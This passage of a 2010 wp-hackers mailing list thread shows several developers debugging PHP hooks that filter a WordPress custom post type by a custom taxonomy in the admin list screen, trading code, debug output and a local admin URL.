>>>>>> thank u Mike and Scribu, I wrote a mix of your solutions :
>>>>>>>
>>>>>>> add_action( 'restrict_manage_posts', 'my_restrict_manage_posts' );
>>>>>>>
>>>>>>> function my_restrict_manage_posts() {
>>>>>>> global $typenow;
>>>>>>> if ($typenow=='ressource_fr')
>>>>>>> wp_dropdown_categories( 'show_option_all=Afficher
>>>>>>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr');
>>>>>>> }
>>>>>>>
>>>>>>> but when I click on 'filter' the result is always ... "no result".
>>>>>>>
>>>>>>> Jimmy
>>>>>>>
>>>>>>>
>>>>>>> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
>>>>>>>
>>>>>>> On Jul 23, 2010, at 3:35 AM, scribu wrote:
>>>>>>>>>> Are you sure? ?Unless I misunderstand what Jimmy is asking I think
>>>> it
>>>>>>>> can
>>>>>>>>>> be done in the "restrict_manage_posts" hook.
>>>>>>>>>
>>>>>>>>> Indeed. Also, he can use wp_dropdown_categories() instead of
>>>> creating
>>>>>>>> the
>>>>>>>>> select manually.
>>>>>>>>
>>>>>>>> Thanks. :)
>>>>>>>>
>>>>>>>> No matter how hard I try, I can't keep track of every function in the
>>>>>>>> library! ?Maybe the new 3.org will help.
>>>>>>>>
>>>>>>>> -Mike
>>>>>>>> _______________________________________________
>>>>>>>> wp-hackers mailing list
>>>>>>>> wp-hackers at lists.automattic.com
>>>>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>>>>>
>>>>>>>
>>>>>>>
>>>>>>
>>>>> _______________________________________________
>>>>> wp-hackers mailing list
>>>>> wp-hackers at lists.automattic.com
>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>
>>>
>>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jimmy.roy at gmail.com  Fri Jul 23 10:02:12 2010
From: jimmy.roy at gmail.com (Jimmy Roy)
Date: Fri, 23 Jul 2010 18:02:12 +0800
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <6EAFDBD0-2AD1-43A7-AB89-17B288E9A6C8@newclarity.net>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com>
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com>
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com>
	<AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com>
	<C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>
	<AANLkTi=JufzLS7L268+SZPn0VWeKewV7zQXP1U4eL9s=@mail.gmail.com>
	<AANLkTikpZH5yx6cpTLuCXpw=imHGMeWkcZgXEfSnc2YW@mail.gmail.com>
	<6EAFDBD0-2AD1-43A7-AB89-17B288E9A6C8@newclarity.net>
Message-ID: <AANLkTik58ZoOPrWqn4BjsZqE8ovD7ZVhwpk0sJc8Loa_@mail.gmail.com>

now, when I click on filter button the result is always the same, all list
of ressources.

my code :

add_action( 'init', 'register_profperso_taxonomies', 0 );

function register_profperso_taxonomies() {

register_taxonomy(
'classement_fr',
array( 'ressource_fr' ),
array(
'public' => true,
'hierarchical' => true,
'labels' => array(
'name' => __( 'Classements FR' ),
'singular_name' => __( 'Classement FR' )
),
'query_var' => 'classement-fr',
        'rewrite' => array( 'slug' => 'cours-fr' ),
)
);
}


// pour filtrer les ressources par classement
add_action( 'restrict_manage_posts','my_restrict_manage_posts' );

function my_restrict_manage_posts() {
global $typenow;
if ($typenow=='ressource_fr')
wp_dropdown_categories( 'show_option_all=Afficher
tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
}

add_action( 'request', 'my_request' );
function my_request($request) {
       if (isset($request['post_type']) &&
$request['post_type']=='ressource_fr') {
               $request['taxonomy'] = 'classement_fr';
               $request['term'] =
get_term($request['classement-fr'],'classement_fr')->name;
               unset($request['name']);
       }
       return $request;
}

generated html :
<select id="classement_fr" name="classement_fr"> <option value="0">Show All
Classements FR</option> <option value="5">Langue oral</option> <option value
="6">Niveau 1</option> <option value="7">Niveau 2</option> <option value="8
">Niveau 3</option> </select><input type="submit" id="post-query-submit"
value="Filtrer" class="button-secondary" />

From mikeschinkel at newclarity.net  Fri Jul 23 10:23:02 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 23 Jul 2010 06:23:02 -0400
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <AANLkTik58ZoOPrWqn4BjsZqE8ovD7ZVhwpk0sJc8Loa_@mail.gmail.com>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com>
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com>
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com>
	<AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com>
	<C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>
	<AANLkTi=JufzLS7L268+SZPn0VWeKewV7zQXP1U4eL9s=@mail.gmail.com>
	<AANLkTikpZH5yx6cpTLuCXpw=imHGMeWkcZgXEfSnc2YW@mail.gmail.com>
	<6EAFDBD0-2AD1-43A7-AB89-17B288E9A6C8@newclarity.net>
	<AANLkTik58ZoOPrWqn4BjsZqE8ovD7ZVhwpk0sJc8Loa_@mail.gmail.com>
Message-ID: <3BD08F18-7C61-4092-8C11-795BC1EF3FC0@newclarity.net>

What do you get in the view source when you using this instead:

function request($request) {
	print_r($request);
	exit;
}

Also, what's your URL after clicking the "Filter" button?

-Mike


On Jul 23, 2010, at 6:02 AM, Jimmy Roy wrote:

> now, when I click on filter button the result is always the same, all list
> of ressources.
> 
> my code :
> 
> add_action( 'init', 'register_profperso_taxonomies', 0 );
> 
> function register_profperso_taxonomies() {
> 
> register_taxonomy(
> 'classement_fr',
> array( 'ressource_fr' ),
> array(
> 'public' => true,
> 'hierarchical' => true,
> 'labels' => array(
> 'name' => __( 'Classements FR' ),
> 'singular_name' => __( 'Classement FR' )
> ),
> 'query_var' => 'classement-fr',
>        'rewrite' => array( 'slug' => 'cours-fr' ),
> )
> );
> }
> 
> 
> // pour filtrer les ressources par classement
> add_action( 'restrict_manage_posts','my_restrict_manage_posts' );
> 
> function my_restrict_manage_posts() {
> global $typenow;
> if ($typenow=='ressource_fr')
> wp_dropdown_categories( 'show_option_all=Afficher
> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
> }
> 
> add_action( 'request', 'my_request' );
> function my_request($request) {
>       if (isset($request['post_type']) &&
> $request['post_type']=='ressource_fr') {
>               $request['taxonomy'] = 'classement_fr';
>               $request['term'] =
> get_term($request['classement-fr'],'classement_fr')->name;
>               unset($request['name']);
>       }
>       return $request;
> }
> 
> generated html :
> <select id="classement_fr" name="classement_fr"> <option value="0">Show All
> Classements FR</option> <option value="5">Langue oral</option> <option value
> ="6">Niveau 1</option> <option value="7">Niveau 2</option> <option value="8
> ">Niveau 3</option> </select><input type="submit" id="post-query-submit"
> value="Filtrer" class="button-secondary" />
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From frank at bueltge.de  Fri Jul 23 10:29:32 2010
From: frank at bueltge.de (Frank Bueltge)
Date: Fri, 23 Jul 2010 12:29:32 +0200
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <3BD08F18-7C61-4092-8C11-795BC1EF3FC0@newclarity.net>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com> 
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com> 
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com> 
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com> 
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com> 
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com> 
	<AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com> 
	<C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>
	<AANLkTi=JufzLS7L268+SZPn0VWeKewV7zQXP1U4eL9s=@mail.gmail.com> 
	<AANLkTikpZH5yx6cpTLuCXpw=imHGMeWkcZgXEfSnc2YW@mail.gmail.com> 
	<6EAFDBD0-2AD1-43A7-AB89-17B288E9A6C8@newclarity.net>
	<AANLkTik58ZoOPrWqn4BjsZqE8ovD7ZVhwpk0sJc8Loa_@mail.gmail.com> 
	<3BD08F18-7C61-4092-8C11-795BC1EF3FC0@newclarity.net>
Message-ID: <AANLkTinTDBVh4ybUdkC8fq2a06ke4yc7ic5N-hgRof17@mail.gmail.com>

with fitler:
Array ( [cat] => 26 [order] => DESC [orderby] => date [post_type] =>
quotes [posts_per_page] => 20 )

default, without filter.
Array ( [order] => DESC [orderby] => date [post_type] => quotes
[posts_per_page] => 20 )



On Fri, Jul 23, 2010 at 12:23 PM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
> What do you get in the view source when you using this instead:
>
> function request($request) {
> ? ? ? ?print_r($request);
> ? ? ? ?exit;
> }
>
> Also, what's your URL after clicking the "Filter" button?
>
> -Mike
>
>
> On Jul 23, 2010, at 6:02 AM, Jimmy Roy wrote:
>
>> now, when I click on filter button the result is always the same, all list
>> of ressources.
>>
>> my code :
>>
>> add_action( 'init', 'register_profperso_taxonomies', 0 );
>>
>> function register_profperso_taxonomies() {
>>
>> register_taxonomy(
>> 'classement_fr',
>> array( 'ressource_fr' ),
>> array(
>> 'public' => true,
>> 'hierarchical' => true,
>> 'labels' => array(
>> 'name' => __( 'Classements FR' ),
>> 'singular_name' => __( 'Classement FR' )
>> ),
>> 'query_var' => 'classement-fr',
>> ? ? ? ?'rewrite' => array( 'slug' => 'cours-fr' ),
>> )
>> );
>> }
>>
>>
>> // pour filtrer les ressources par classement
>> add_action( 'restrict_manage_posts','my_restrict_manage_posts' );
>>
>> function my_restrict_manage_posts() {
>> global $typenow;
>> if ($typenow=='ressource_fr')
>> wp_dropdown_categories( 'show_option_all=Afficher
>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
>> }
>>
>> add_action( 'request', 'my_request' );
>> function my_request($request) {
>> ? ? ? if (isset($request['post_type']) &&
>> $request['post_type']=='ressource_fr') {
>> ? ? ? ? ? ? ? $request['taxonomy'] = 'classement_fr';
>> ? ? ? ? ? ? ? $request['term'] =
>> get_term($request['classement-fr'],'classement_fr')->name;
>> ? ? ? ? ? ? ? unset($request['name']);
>> ? ? ? }
>> ? ? ? return $request;
>> }
>>
>> generated html :
>> <select id="classement_fr" name="classement_fr"> <option value="0">Show All
>> Classements FR</option> <option value="5">Langue oral</option> <option value
>> ="6">Niveau 1</option> <option value="7">Niveau 2</option> <option value="8
>> ">Niveau 3</option> </select><input type="submit" id="post-query-submit"
>> value="Filtrer" class="button-secondary" />
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Fri Jul 23 10:31:21 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 23 Jul 2010 06:31:21 -0400
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <AANLkTinTDBVh4ybUdkC8fq2a06ke4yc7ic5N-hgRof17@mail.gmail.com>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com>
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com>
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com>
	<AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com>
	<C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>
	<AANLkTi=JufzLS7L268+SZPn0VWeKewV7zQXP1U4eL9s=@mail.gmail.com>
	<AANLkTikpZH5yx6cpTLuCXpw=imHGMeWkcZgXEfSnc2YW@mail.gmail.com>
	<6EAFDBD0-2AD1-43A7-AB89-17B288E9A6C8@newclarity.net>
	<AANLkTik58ZoOPrWqn4BjsZqE8ovD7ZVhwpk0sJc8Loa_@mail.gmail.com>
	<3BD08F18-7C61-4092-8C11-795BC1EF3FC0@newclarity.net>
	<AANLkTinTDBVh4ybUdkC8fq2a06ke4yc7ic5N-hgRof17@mail.gmail.com>
Message-ID: <131219FF-A4BD-4DD4-921E-2584E2636833@newclarity.net>

Frank,

Please show me your  register_post_type, request hook, restrict_manage_posts. Post the code at http://wordpress.pastebin.com/ or http://gist.github.com/ so it's indented and easier to read.

-Mike

On Jul 23, 2010, at 6:29 AM, Frank Bueltge wrote:

> with fitler:
> Array ( [cat] => 26 [order] => DESC [orderby] => date [post_type] =>
> quotes [posts_per_page] => 20 )
> 
> default, without filter.
> Array ( [order] => DESC [orderby] => date [post_type] => quotes
> [posts_per_page] => 20 )
> 
> 
> 
> On Fri, Jul 23, 2010 at 12:23 PM, Mike Schinkel
> <mikeschinkel at newclarity.net> wrote:
>> What do you get in the view source when you using this instead:
>> 
>> function request($request) {
>>        print_r($request);
>>        exit;
>> }
>> 
>> Also, what's your URL after clicking the "Filter" button?
>> 
>> -Mike
>> 
>> 
>> On Jul 23, 2010, at 6:02 AM, Jimmy Roy wrote:
>> 
>>> now, when I click on filter button the result is always the same, all list
>>> of ressources.
>>> 
>>> my code :
>>> 
>>> add_action( 'init', 'register_profperso_taxonomies', 0 );
>>> 
>>> function register_profperso_taxonomies() {
>>> 
>>> register_taxonomy(
>>> 'classement_fr',
>>> array( 'ressource_fr' ),
>>> array(
>>> 'public' => true,
>>> 'hierarchical' => true,
>>> 'labels' => array(
>>> 'name' => __( 'Classements FR' ),
>>> 'singular_name' => __( 'Classement FR' )
>>> ),
>>> 'query_var' => 'classement-fr',
>>>        'rewrite' => array( 'slug' => 'cours-fr' ),
>>> )
>>> );
>>> }
>>> 
>>> 
>>> // pour filtrer les ressources par classement
>>> add_action( 'restrict_manage_posts','my_restrict_manage_posts' );
>>> 
>>> function my_restrict_manage_posts() {
>>> global $typenow;
>>> if ($typenow=='ressource_fr')
>>> wp_dropdown_categories( 'show_option_all=Afficher
>>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
>>> }
>>> 
>>> add_action( 'request', 'my_request' );
>>> function my_request($request) {
>>>       if (isset($request['post_type']) &&
>>> $request['post_type']=='ressource_fr') {
>>>               $request['taxonomy'] = 'classement_fr';
>>>               $request['term'] =
>>> get_term($request['classement-fr'],'classement_fr')->name;
>>>               unset($request['name']);
>>>       }
>>>       return $request;
>>> }
>>> 
>>> generated html :
>>> <select id="classement_fr" name="classement_fr"> <option value="0">Show All
>>> Classements FR</option> <option value="5">Langue oral</option> <option value
>>> ="6">Niveau 1</option> <option value="7">Niveau 2</option> <option value="8
>>> ">Niveau 3</option> </select><input type="submit" id="post-query-submit"
>>> value="Filtrer" class="button-secondary" />
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From jimmy.roy at gmail.com  Fri Jul 23 10:32:14 2010
From: jimmy.roy at gmail.com (Jimmy Roy)
Date: Fri, 23 Jul 2010 18:32:14 +0800
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <3BD08F18-7C61-4092-8C11-795BC1EF3FC0@newclarity.net>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com>
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com>
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com>
	<AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com>
	<C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>
	<AANLkTi=JufzLS7L268+SZPn0VWeKewV7zQXP1U4eL9s=@mail.gmail.com>
	<AANLkTikpZH5yx6cpTLuCXpw=imHGMeWkcZgXEfSnc2YW@mail.gmail.com>
	<6EAFDBD0-2AD1-43A7-AB89-17B288E9A6C8@newclarity.net>
	<AANLkTik58ZoOPrWqn4BjsZqE8ovD7ZVhwpk0sJc8Loa_@mail.gmail.com>
	<3BD08F18-7C61-4092-8C11-795BC1EF3FC0@newclarity.net>
Message-ID: <AANLkTikPOhcktD-Gk9VN4h8zvExGRT3F=TZHv+Q-2YmQ@mail.gmail.com>

Array ( [order] => asc [orderby] => menu_order title [post_type] =>
ressource_fr [posts_per_page] => -1 [posts_per_archive_page] => -1 )

url after clicking "filter" button :

http://localhost:8888/wp3.0/profperso/wp-admin/edit.php?s&post_status=all&post_type=ressource_fr&mode=list&action=-1&m=0&classement_fr=6&action2=-1


2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>

> What do you get in the view source when you using this instead:
>
> function request($request) {
>        print_r($request);
>        exit;
> }
>
> Also, what's your URL after clicking the "Filter" button?
>
> -Mike
>
>
> On Jul 23, 2010, at 6:02 AM, Jimmy Roy wrote:
>
> > now, when I click on filter button the result is always the same, all
> list
> > of ressources.
> >
> > my code :
> >
> > add_action( 'init', 'register_profperso_taxonomies', 0 );
> >
> > function register_profperso_taxonomies() {
> >
> > register_taxonomy(
> > 'classement_fr',
> > array( 'ressource_fr' ),
> > array(
> > 'public' => true,
> > 'hierarchical' => true,
> > 'labels' => array(
> > 'name' => __( 'Classements FR' ),
> > 'singular_name' => __( 'Classement FR' )
> > ),
> > 'query_var' => 'classement-fr',
> >        'rewrite' => array( 'slug' => 'cours-fr' ),
> > )
> > );
> > }
> >
> >
> > // pour filtrer les ressources par classement
> > add_action( 'restrict_manage_posts','my_restrict_manage_posts' );
> >
> > function my_restrict_manage_posts() {
> > global $typenow;
> > if ($typenow=='ressource_fr')
> > wp_dropdown_categories( 'show_option_all=Afficher
> >
> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
> > }
> >
> > add_action( 'request', 'my_request' );
> > function my_request($request) {
> >       if (isset($request['post_type']) &&
> > $request['post_type']=='ressource_fr') {
> >               $request['taxonomy'] = 'classement_fr';
> >               $request['term'] =
> > get_term($request['classement-fr'],'classement_fr')->name;
> >               unset($request['name']);
> >       }
> >       return $request;
> > }
> >
> > generated html :
> > <select id="classement_fr" name="classement_fr"> <option value="0">Show
> All
> > Classements FR</option> <option value="5">Langue oral</option> <option
> value
> > ="6">Niveau 1</option> <option value="7">Niveau 2</option> <option
> value="8
> > ">Niveau 3</option> </select><input type="submit" id="post-query-submit"
> > value="Filtrer" class="button-secondary" />
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Fri Jul 23 10:37:28 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 23 Jul 2010 06:37:28 -0400
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <AANLkTinTDBVh4ybUdkC8fq2a06ke4yc7ic5N-hgRof17@mail.gmail.com>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com>
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com>
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com>
	<AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com>
	<C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>
	<AANLkTi=JufzLS7L268+SZPn0VWeKewV7zQXP1U4eL9s=@mail.gmail.com>
	<AANLkTikpZH5yx6cpTLuCXpw=imHGMeWkcZgXEfSnc2YW@mail.gmail.com>
	<6EAFDBD0-2AD1-43A7-AB89-17B288E9A6C8@newclarity.net>
	<AANLkTik58ZoOPrWqn4BjsZqE8ovD7ZVhwpk0sJc8Loa_@mail.gmail.com>
	<3BD08F18-7C61-4092-8C11-795BC1EF3FC0@newclarity.net>
	<AANLkTinTDBVh4ybUdkC8fq2a06ke4yc7ic5N-hgRof17@mail.gmail.com>
Message-ID: <03F5F434-DB8A-426C-9782-E7BF378C7B7B@newclarity.net>

Frank,

You are using "category" instead a custom taxonomy so I don't think you need a request hook.  Try without.

-Mike
 
On Jul 23, 2010, at 6:29 AM, Frank Bueltge wrote:

> with fitler:
> Array ( [cat] => 26 [order] => DESC [orderby] => date [post_type] =>
> quotes [posts_per_page] => 20 )
> 
> default, without filter.
> Array ( [order] => DESC [orderby] => date [post_type] => quotes
> [posts_per_page] => 20 )
> 
> 
> 
> On Fri, Jul 23, 2010 at 12:23 PM, Mike Schinkel
> <mikeschinkel at newclarity.net> wrote:
>> What do you get in the view source when you using this instead:
>> 
>> function request($request) {
>>        print_r($request);
>>        exit;
>> }
>> 
>> Also, what's your URL after clicking the "Filter" button?
>> 
>> -Mike
>> 
>> 
>> On Jul 23, 2010, at 6:02 AM, Jimmy Roy wrote:
>> 
>>> now, when I click on filter button the result is always the same, all list
>>> of ressources.
>>> 
>>> my code :
>>> 
>>> add_action( 'init', 'register_profperso_taxonomies', 0 );
>>> 
>>> function register_profperso_taxonomies() {
>>> 
>>> register_taxonomy(
>>> 'classement_fr',
>>> array( 'ressource_fr' ),
>>> array(
>>> 'public' => true,
>>> 'hierarchical' => true,
>>> 'labels' => array(
>>> 'name' => __( 'Classements FR' ),
>>> 'singular_name' => __( 'Classement FR' )
>>> ),
>>> 'query_var' => 'classement-fr',
>>>        'rewrite' => array( 'slug' => 'cours-fr' ),
>>> )
>>> );
>>> }
>>> 
>>> 
>>> // pour filtrer les ressources par classement
>>> add_action( 'restrict_manage_posts','my_restrict_manage_posts' );
>>> 
>>> function my_restrict_manage_posts() {
>>> global $typenow;
>>> if ($typenow=='ressource_fr')
>>> wp_dropdown_categories( 'show_option_all=Afficher
>>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
>>> }
>>> 
>>> add_action( 'request', 'my_request' );
>>> function my_request($request) {
>>>       if (isset($request['post_type']) &&
>>> $request['post_type']=='ressource_fr') {
>>>               $request['taxonomy'] = 'classement_fr';
>>>               $request['term'] =
>>> get_term($request['classement-fr'],'classement_fr')->name;
>>>               unset($request['name']);
>>>       }
>>>       return $request;
>>> }
>>> 
>>> generated html :
>>> <select id="classement_fr" name="classement_fr"> <option value="0">Show All
>>> Classements FR</option> <option value="5">Langue oral</option> <option value
>>> ="6">Niveau 1</option> <option value="7">Niveau 2</option> <option value="8
>>> ">Niveau 3</option> </select><input type="submit" id="post-query-submit"
>>> value="Filtrer" class="button-secondary" />
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From mikeschinkel at newclarity.net  Fri Jul 23 10:39:37 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 23 Jul 2010 06:39:37 -0400
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <AANLkTikPOhcktD-Gk9VN4h8zvExGRT3F=TZHv+Q-2YmQ@mail.gmail.com>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com>
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com>
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com>
	<AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com>
	<C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>
	<AANLkTi=JufzLS7L268+SZPn0VWeKewV7zQXP1U4eL9s=@mail.gmail.com>
	<AANLkTikpZH5yx6cpTLuCXpw=imHGMeWkcZgXEfSnc2YW@mail.gmail.com>
	<6EAFDBD0-2AD1-43A7-AB89-17B288E9A6C8@newclarity.net>
	<AANLkTik58ZoOPrWqn4BjsZqE8ovD7ZVhwpk0sJc8Loa_@mail.gmail.com>
	<3BD08F18-7C61-4092-8C11-795BC1EF3FC0@newclarity.net>
	<AANLkTikPOhcktD-Gk9VN4h8zvExGRT3F=TZHv+Q-2YmQ@mail.gmail.com>
Message-ID: <7EC8DB89-7E18-4F2C-B94A-E1B78B29EA88@newclarity.net>

Jimmy,

Please do the same I asked of Frank. Again, show me your  register_post_type, request hook, restrict_manage_posts. Post the code at http://wordpress.pastebin.com/ or http://gist.github.com/ so it's indented and easier to read.

Also, are you using any other plugins that might be affecting the query vars?

-Mike

